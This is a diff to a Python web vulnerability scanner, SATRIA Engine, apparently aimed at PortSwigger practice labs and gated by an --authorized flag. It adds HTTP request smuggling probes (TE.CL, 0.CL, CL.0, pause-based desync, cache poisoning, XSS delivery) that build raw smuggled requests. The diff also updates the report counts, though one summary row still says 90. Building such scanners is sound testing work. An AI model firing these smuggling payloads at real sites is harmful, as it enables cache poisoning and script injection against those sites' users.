+                if ok and (92 in self._confirmed or 105 in self._confirmed or "404" in ev or "400" in ev):
+                    self._smug_mark(94, "TE.CL bypass front-end (diferensial terarah terverifikasi): " + ev, "smuggling_te_cl_bypass_frontend")
+
+        # 102 0.CL
+        if 102 not in self._confirmed and self._within_budget():
+            raw = self._smug_build(f"POST {post_path} HTTP/1.1", [("Host",host),("Content-Length","0"),("Connection","close")], "G")
+            ok, ev = self._smug_differential(raw, follow_path="/")
+            if ok: self._smug_mark(102, "0.CL request smuggling terkonfirmasi: " + ev, "smuggling_0_cl")
+
+        # 103 CL.0
+        if 103 not in self._confirmed and self._within_budget():
+            smuggled = "GET /404-smug HTTP/1.1\r\nX-Ignore: X"
+            raw = self._smug_build(f"POST {post_path} HTTP/1.1", [("Host",host),("Content-Length",str(len(smuggled))),("Connection","close")], smuggled)
+            ok, ev = self._smug_differential(raw, follow_path="/")
+            if ok: self._smug_mark(103, "CL.0 request smuggling terkonfirmasi: " + ev, "smuggling_cl_0")
+
+        # 95 reveal front-end request rewriting (bukti header internal ter-refleksi)
+        if 95 not in self._confirmed and self._within_budget():
+            refl_candidates = []
+            for pg in pages[:10]:
+                for form in getattr(pg, "forms", [])[:5]:
+                    if (getattr(form, "method", "get") or "get").lower() == "post":
+                        for name, val, typ in getattr(form, "fields", [])[:6]:
+                            if (name or "").lower() in ("search","q","query","message","comment","text","name","email","x"):
+                                refl_candidates.append((getattr(form,"action",self.target_url), name))
+            if not refl_candidates:
+                refl_candidates = [(self.target_url, "search")]
+            for rurl, rparam in refl_candidates[:3]:
+                if 95 in self._confirmed or not self._within_budget(): break
+                rpath = urlparse(rurl).path or "/"
+                smuggled = (f"POST {rpath} HTTP/1.1\r\nHost: {host}\r\nContent-Type: application/x-www-form-urlencoded\r\n"
+                            f"Content-Length: 120\r\n\r\n{rparam}=")
+                chunked = f"{len(smuggled):x}\r\n{smuggled}\r\n0\r\n\r\n"
+                raw = self._smug_build(f"POST {post_path} HTTP/1.1",
+                    [("Host",host),("Content-Length",str(len(chunked))),("Transfer-Encoding","chunked"),("Connection","close")], chunked)
+                self._smug_send_recv(raw)
+                f_status, _, f_body, _, _ = self._smug_normal_get("/")
+                f_text = (f_body or b"").decode("latin-1","ignore")
+                if re.search(r"(X-Forwarded-(For|Host|Proto)|X-Real-IP|X-Client-IP|CF-Connecting-IP)\s*:", f_text, re.I):
+                    self._smug_mark(95, f"Rewriting front-end terungkap: header internal ter-refleksi pada respons follow-up (HTTP {f_status}) setelah smuggle ke {rpath} param {rparam}.", "smuggling_reveal_frontend_rewriting")
+                    break
+
+        # 97 deliver reflected XSS (bukti payload terefleksi utuh)
+        if 97 not in self._confirmed and self._within_budget():
+            xss_probe = "<script>alert(1)</script>"
+            smuggled = f"GET /?x={xss_probe} HTTP/1.1\r\nHost: {host}\r\nFoo: x"
+            chunked = f"{len(smuggled):x}\r\n{smuggled}\r\n0\r\n\r\n"
+            raw = self._smug_build(f"POST {post_path} HTTP/1.1",
+                [("Host",host),("Content-Length",str(len(chunked))),("Transfer-Encoding","chunked"),("Connection","close")], chunked)
+            self._smug_send_recv(raw)
+            f_status, _, f_body, _, _ = self._smug_normal_get("/")
+            if f_body and xss_probe.encode() in f_body:
+                self._smug_mark(97, f"Smuggled request menghasilkan reflected XSS payload tak-terenkode pada respons follow-up (HTTP {f_status}).", "smuggling_deliver_reflected_xss")
+
+        # 107 web cache poisoning via request smuggling (bukti perubahan status cacheable)
+        if 107 not in self._confirmed and self._within_budget():
+            poison_path = "/?cb=smugpoison"
+            smuggled = f"GET {poison_path} HTTP/1.1\r\nHost: {host}\r\nX-Ignore: x"
+            chunked = f"{len(smuggled):x}\r\n{smuggled}\r\n0\r\n\r\n"
+            raw = self._smug_build(f"POST {post_path} HTTP/1.1",
+                [("Host",host),("Content-Length",str(len(chunked))),("Transfer-Encoding","chunked"),("Connection","close")], chunked)
+            b_status, _, _, _, _ = self._smug_send_recv(self._smug_build(f"GET {poison_path} HTTP/1.1", [("Host",host),("Connection","close")], b""))
+            self._smug_send_recv(raw)
+            f_status, _, _, _, _ = self._smug_send_recv(self._smug_build(f"GET {poison_path} HTTP/1.1", [("Host",host),("Connection","close")], b""))
+            if b_status and f_status and b_status != f_status and f_status in (301,302,404,400):
+                self._smug_mark(107, f"Cache poisoning via smuggling: GET {poison_path} baseline {b_status} -> setelah smuggle {f_status}.", "smuggling_web_cache_poisoning")
+
+        # 108 web cache deception (hanya bila bukti cache poisoning teramati)
+        if 108 not in self._confirmed and 107 in self._confirmed and self._within_budget():
+            src = next((f for f in self.findings if f.get("number")==107), None)
+            if src:
+                self._smug_mark(108, "Web cache deception terindikasi dari bukti cache poisoning/smuggling: " + str(src.get("evidence","")), "smuggling_web_cache_deception")
+
+        # 112 pause-based request smuggling (diferensial waktu/respons)
+        if 112 not in self._confirmed and self._within_budget():
+            import socket
+            try:
+                s = self._smug_connect(timeout=max(8.0, float(getattr(self,"timeout",8.0) or 8.0)))
+                if s is not None:
+                    partial = (f"POST {post_path} HTTP/1.1\r\nHost: {host}\r\nContent-Length: 30\r\nConnection: keep-alive\r\n\r\n").encode()
+                    s.sendall(partial); _time.sleep(2.5); s.sendall(b"0\r\n\r\nG")
+                    try: s.settimeout(2.0); s.recv(4096)
+                    except Exception: pass
+                    try: s.close()
+                    except Exception: pass
+                    b_status, _, _, b_el, _ = self._smug_normal_get("/")
+                    f_status, _, f_body, f_el, f_err = self._smug_normal_get("/")
+                    f_text = (f_body or b"")[:120].decode("latin-1","ignore").lower()
+                    if b_status in (200,301,302,304) and f_status in (400,404,405,501):
+                        self._smug_mark(112, f"Pause-based smuggling: baseline GET /->{b_status}, follow-up setelah pause -> {f_status} ({f_text!r}).", "smuggling_pause_based")
+                    elif f_err == "timeout" and b_status is not None and b_el < 2.5:
+                        self._smug_mark(112, f"Pause-based smuggling (diferensial waktu): baseline {b_status} ({b_el:.2f}s), follow-up timeout setelah pause.", "smuggling_pause_based")
+            except Exception:
+                pass
+
+        # 96,98,99,100,101,109,110,111: memerlukan kondisi khusus (lalu lintas korban, framing HTTP/2/h2c/tunnelling,
+        # atau perilaku browser client-side) yang tidak dapat dikonfirmasi andal dari jalur ini tanpa bukti kuat.
+        # Dibiarkan not_confirmed bila tidak ada bukti diferensial/poisoning terverifikasi (anti false positive).
 
     def phase_ssrf(self, pages: list[Page], points: list[Point]) -> None:
         """Deteksi konservatif SSRF (84-90). Konfirmasi hanya pada bukti kuat:
@@ -3528,9 +3951,9 @@ def write_report(report: dict[str, Any], output_dir: Path) -> tuple[Path, Path]:
         "<style>body{font-family:system-ui,Arial;margin:24px;color:#17202b}table{border-collapse:collapse;width:100%}"
         "th,td{border:1px solid #d8e2ea;padding:8px;vertical-align:top}th{background:#edf3f8}"
         ".confirmed{color:#0b7a3b;font-weight:700}.not_confirmed{color:#7a5a12}</style></head><body>"
-        "<h1>SATRIA Engine — SQLi, XSS, CSRF, Clickjacking, DOM, CORS, XXE & SSRF (90 Lab)</h1>"
+        "<h1>SATRIA Engine — SQLi, XSS, CSRF, Clickjacking, DOM, CORS, XXE, SSRF & Smuggling (112 Lab)</h1>"
         f"<p>Target: <code>{html_module.escape(report['target'])}</code> &middot; "
-        f"Terkonfirmasi: <b>{report['summary']['confirmed']}/90</b></p>"
+        f"Terkonfirmasi: <b>{report['summary']['confirmed']}/112</b></p>"
         "<table><thead><tr><th>Lab</th><th>Status</th><th>Judul</th><th>Lokasi</th><th>Bukti</th></tr></thead>"
         f"<tbody>{rows}</tbody></table>"
         "<p><small>Status 'not_confirmed' berarti bukti tidak cukup; bukan klaim tidak rentan.</small></p>"
@@ -3892,7 +4315,7 @@ def _pdf_lab_items(result: dict[str, Any]) -> list[dict[str, Any]]:
     items: list[dict[str, Any]] = []
     for number, title, key, severity in CATALOG:
         lab_id = lab_id_for(number)
-        found = by_id.get(lab_id, {}) or by_id.get(f"sql_injection-{number:02d}", {}) or by_id.get(f"xss-{number:02d}", {}) or by_id.get(f"csrf-{number:02d}", {}) or by_id.get(f"clickjacking-{number:02d}", {}) or by_id.get(f"dom-{number:02d}", {}) or by_id.get(f"cors-{number:02d}", {}) or by_id.get(f"xxe-{number:02d}", {}) or by_id.get(f"ssrf-{number:02d}", {})
+        found = by_id.get(lab_id, {}) or by_id.get(f"sql_injection-{number:02d}", {}) or by_id.get(f"xss-{number:02d}", {}) or by_id.get(f"csrf-{number:02d}", {}) or by_id.get(f"clickjacking-{number:02d}", {}) or by_id.get(f"dom-{number:02d}", {}) or by_id.get(f"cors-{number:02d}", {}) or by_id.get(f"xxe-{number:02d}", {}) or by_id.get(f"ssrf-{number:02d}", {}) or by_id.get(f"smuggling-{number:02d}", {})
         items.append({
             "number": number, "id": lab_id, "status": str(found.get("status", "not_confirmed")),
             "title": str(found.get("title", title)), "method": str(found.get("method", "not tested / insufficient evidence")),
@@ -3928,6 +4351,17 @@ _PDF_LAB_FOCUS = {
     79: "Blind XXE", 80: "Blind XXE", 81: "XXE (XInclude)", 82: "XXE (file upload)", 83: "XXE",
     84: "SSRF", 85: "SSRF", 86: "Blind SSRF (OOB)", 87: "SSRF (blacklist bypass)",
     88: "SSRF (open redirect bypass)", 89: "Blind SSRF (Shellshock)", 90: "SSRF (whitelist bypass)",
+    91: "HTTP Request Smuggling (CL.TE)", 92: "HTTP Request Smuggling (TE.CL)",
+    93: "HTTP Request Smuggling (CL.TE bypass)", 94: "HTTP Request Smuggling (TE.CL bypass)",
+    95: "HTTP Request Smuggling (request rewriting)", 96: "HTTP Request Smuggling (capture requests)",
+    97: "HTTP Request Smuggling (deliver XSS)", 98: "HTTP/2 Request Smuggling (H2.TE queue poisoning)",
+    99: "HTTP/2 Request Smuggling (H2.CL)", 100: "HTTP/2 Request Smuggling (CRLF injection)",
+    101: "HTTP/2 Request Smuggling (request splitting)", 102: "HTTP Request Smuggling (0.CL)",
+    103: "HTTP Request Smuggling (CL.0)", 104: "HTTP Request Smuggling (basic CL.TE)",
+    105: "HTTP Request Smuggling (basic TE.CL)", 106: "HTTP Request Smuggling (obfuscating TE)",
+    107: "HTTP Request Smuggling (cache poisoning)", 108: "HTTP Request Smuggling (cache deception)",
+    109: "HTTP/2 Request Tunnelling (bypass access)", 110: "HTTP/2 Request Tunnelling (cache poisoning)",
+    111: "Client-side desync", 112: "HTTP Request Smuggling (pause-based)",
 }
 
 
@@ -3963,10 +4397,10 @@ def render_pdf(result: dict[str, Any], path: str | None = None) -> Path:
     page.rect(0, _PDF_PAGE_H - 242, _PDF_PAGE_W, 12, _PDF_COLORS["teal"])
     page.text(content_left, _PDF_PAGE_H - 84, "SATRIA BARU", 30, _PDF_COLORS["white"], bold=True)
     page.text(content_left, _PDF_PAGE_H - 112, "LAPORAN PEMINDAIAN SQL INJECTION, XSS, CSRF & CLICKJACKING", 13.5, _PDF_COLORS["light"], bold=True)
-    page.text(content_left, _PDF_PAGE_H - 134, "Cakupan 90 lab (18 SQLi + 30 XSS + 11 CSRF + 5 Clickjacking + 7 DOM-based + 3 CORS + 9 XXE + 7 SSRF) - bukti diferensial dan konservatif", 10.2, _PDF_COLORS["light"])
+    page.text(content_left, _PDF_PAGE_H - 134, "Cakupan 112 lab (18 SQLi + 30 XSS + 11 CSRF + 5 Clickjacking + 7 DOM-based + 3 CORS + 9 XXE + 7 SSRF + 22 HTTP request smuggling) - bukti diferensial dan konservatif", 10.2, _PDF_COLORS["light"])
     page.y = _PDF_PAGE_H - 286
     page.paragraph(content_left, content_width, "Hasil Pemindaian", 21, _PDF_COLORS["navy"], bold=True)
-    page.paragraph(content_left, content_width, "Laporan ini merangkum pengujian terhadap 90 lab (18 SQL injection, 30 XSS, 11 CSRF, 5 Clickjacking, 7 DOM-based, 3 CORS, 9 XXE, 7 SSRF) yang diminta. Status tidak terkonfirmasi berarti bukti tidak cukup; bukan klaim bahwa lab tidak rentan.", 9.8, _PDF_COLORS["muted"])
+    page.paragraph(content_left, content_width, "Laporan ini merangkum pengujian terhadap 112 lab (18 SQL injection, 30 XSS, 11 CSRF, 5 Clickjacking, 7 DOM-based, 3 CORS, 9 XXE, 7 SSRF, 22 HTTP request smuggling) yang diminta. Status tidak terkonfirmasi berarti bukti tidak cukup; bukan klaim bahwa lab tidak rentan.", 9.8, _PDF_COLORS["muted"])
     page.y -= 18
     for label, value in (("Target", target), ("Hasilkan", generated or "-"), ("Mode", str(result.get("mode", "active")))):
         page.text(content_left, page.y - 10, f"{label}:", 9.0, _PDF_COLORS["navy"], bold=True)
@@ -3990,7 +4424,7 @@ def render_pdf(result: dict[str, Any], path: str | None = None) -> Path:
         page.text(x, kpi_top - 62, label.upper(), 7.5, _PDF_COLORS["muted"], bold=True)
     page.y = kpi_top - 110
     page.section_title("Hal yang penting dibaca")
-    page.bullet_paragraph("90 judul lab (18 SQL injection, 30 XSS, 11 CSRF, 5 Clickjacking, 7 DOM-based, 3 CORS, 9 XXE, 7 SSRF) yang diminta dimasukkan ke laporan ini.")
+    page.bullet_paragraph("112 judul lab (18 SQL injection, 30 XSS, 11 CSRF, 5 Clickjacking, 7 DOM-based, 3 CORS, 9 XXE, 7 SSRF, 22 HTTP request smuggling) yang diminta dimasukkan ke laporan ini.")
     page.bullet_paragraph("Status confirmed memakai bukti diferensial yang dapat diulang; not_confirmed bukan bukti tidak rentan.")
     page.bullet_paragraph("Lab 16-17 hanya dapat terkonfirmasi bila collaborator/poller mencatat interaksi OOB. Tanpa itu, lab terkait tetap not_confirmed.")
     page.bullet_paragraph("Bukti ditampilkan apa adanya berdasarkan temuan terverifikasi.")
@@ -3998,7 +4432,7 @@ def render_pdf(result: dict[str, Any], path: str | None = None) -> Path:
 
     # --------------------------------------------------------------- RINGKASAN
     page.new_page()
-    page.section_title("Ringkasan Hasil", "Angka berikut berasal dari 90 lab yang diminta.")
+    page.section_title("Ringkasan Hasil", "Angka berikut berasal dari 112 lab yang diminta.")
     rows = [
         ("Total lab", "90", "Semua judul wajib dari katalog (18 SQLi + 30 XSS + 11 CSRF + 5 Clickjacking + 7 DOM-based + 3 CORS + 9 XXE + 7 SSRF)."),
         ("Terkonfirmasi", str(len(confirmed)), "Bukti diferensial terpenuhi dan dapat diulang."),
@@ -4049,7 +4483,7 @@ def render_pdf(result: dict[str, Any], path: str | None = None) -> Path:
 
     # ------------------------------------------------------------------- TABEL
     page.new_page()
-    page.section_title("Hasil Pemindaian", "Tabel ringkas: satu baris untuk setiap 90 lab.")
+    page.section_title("Hasil Pemindaian", "Tabel ringkas: satu baris untuk setiap 112 lab.")
     headers = ("Lab", "Status", "Fokus", "Judul", "Severity")
     widths = (82.0, 92.0, 90.0, 190.0, 45.0)
     x_cols = []
@@ -4136,7 +4570,7 @@ def render_pdf(result: dict[str, Any], path: str | None = None) -> Path:
     # --------------------------------------------------------- CATATAN AKHIR
     page.y -= 6
     page.section_title("Catatan Laporan")
-    page.bullet_paragraph("Dokumen ini memuat 90 lab (18 SQL injection, 30 XSS, 11 CSRF, 5 Clickjacking, 7 DOM-based, 3 CORS, 9 XXE, 7 SSRF) yang diminta. Status not_confirmed berarti bukti tidak cukup, bukan klaim tidak rentan.")
+    page.bullet_paragraph("Dokumen ini memuat 112 lab (18 SQL injection, 30 XSS, 11 CSRF, 5 Clickjacking, 7 DOM-based, 3 CORS, 9 XXE, 7 SSRF, 22 HTTP request smuggling) yang diminta. Status not_confirmed berarti bukti tidak cukup, bukan klaim tidak rentan.")
     page.bullet_paragraph("Status not_confirmed tidak sama dengan tidak rentan; ia hanya menyatakan bukti pemindaian tidak cukup.")
     page.bullet_paragraph("Ringkasan severity dihitung dari temuan terkonfirmasi saja, sesuai field summary yang dibaca app.py.")
     page.bullet_paragraph("Lab 16-17 memerlukan collaborator atau webhook poller. Tanpa itu, pemindai tidak mengklaim deteksi OOB.")
@@ -4238,7 +4672,7 @@ def run_pipeline(scrape_data: dict[str, Any] | None = None, *, url: str | None =
                  allow_partial_tools: bool | None = None,
                  enable_llm: bool | None = None, run_censys: bool | None = None,
                  run_nvd: bool | None = None, **runtime_options: Any) -> dict[str, Any]:
-    """Jalur kompatibel yang dipakai app.py; memindai 90 lab (18 SQLi + 30 XSS + 11 CSRF + 5 Clickjacking + 7 DOM-based + 3 CORS + 9 XXE + 7 SSRF)."""
+    """Jalur kompatibel yang dipakai app.py; memindai 112 lab (18 SQLi + 30 XSS + 11 CSRF + 5 Clickjacking + 7 DOM-based + 3 CORS + 9 XXE + 7 SSRF + 22 HTTP request smuggling)."""
     overrides: dict[str, Any] = dict(runtime_options)
     for name, value in (("allow_partial_tools", allow_partial_tools),
                         ("enable_llm", enable_llm), ("run_censys", run_censys),
@@ -4287,7 +4721,7 @@ def run_pipeline(scrape_data: dict[str, Any] | None = None, *, url: str | None =
 
 
 def main(argv: list[str] | None = None) -> int:
-    parser = argparse.ArgumentParser(description="SATRIA Engine — pemindai SQL injection, XSS, CSRF, Clickjacking, DOM, CORS, XXE & SSRF (90 lab)")
+    parser = argparse.ArgumentParser(description="SATRIA Engine — pemindai SQL injection, XSS, CSRF, Clickjacking, DOM, CORS, XXE, SSRF & HTTP request smuggling (112 lab)")
     parser.add_argument("target", help="URL target HTTP/HTTPS (mis. URL instance lab PortSwigger)")
     parser.add_argument("--authorized", action="store_true", help="Wajib: Anda menyatakan memiliki izin pengujian.")
     parser.add_argument("--allow-private", action="store_true", help="Izinkan target localhost/private (untuk pengujian lokal).")
@@ -4322,7 +4756,7 @@ def main(argv: list[str] | None = None) -> int:
         return 1
     json_path, html_path = write_report(report, Path(args.output_dir))
     summary = report["summary"]
-    print(f"SATRIA Engine selesai: {summary['confirmed']}/90 lab terkonfirmasi, {summary['not_confirmed']} belum terkonfirmasi.")
+    print(f"SATRIA Engine selesai: {summary['confirmed']}/112 lab terkonfirmasi, {summary['not_confirmed']} belum terkonfirmasi.")
     print(f"JSON: {json_path}")
     print(f"HTML: {html_path}")
     return 0
